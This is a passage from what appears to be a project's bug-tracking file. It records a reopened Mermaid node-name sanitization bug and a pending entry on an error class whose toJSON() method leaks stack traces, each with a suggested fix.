- **validator_notes:** `REOPENED (2nd time): Both toMermaid() in graph.ts and toMermaidDetailed() in inspect.ts still embed raw node names without sanitization. lbl() helper has no sanitize() call. Test file mermaid-node-injection.test.ts still missing. Fix must add sanitization to BOTH functions and create regression tests.`

---

### BUG-0295
- **status:** `pending`
- **severity:** `low`
- **file:** `src/errors.ts`
- **line:** `58`
- **category:** `information-disclosure`
- **description:** `ONIError.toJSON()` and `toInternalJSON()` are identical — both expose `stack` in their output. The method names imply different audiences (external vs internal), but the external-facing `toJSON()` leaks call stack traces, revealing internal file paths and library versions to callers. Any code that serializes an `ONIError` to a client or log sink via `JSON.stringify()` or similar will inadvertently expose stack information. Fix: remove the `stack` field from `toJSON()` so only `toInternalJSON()` includes it. OWASP A05:2021 - Security Misconfiguration.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T13:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---
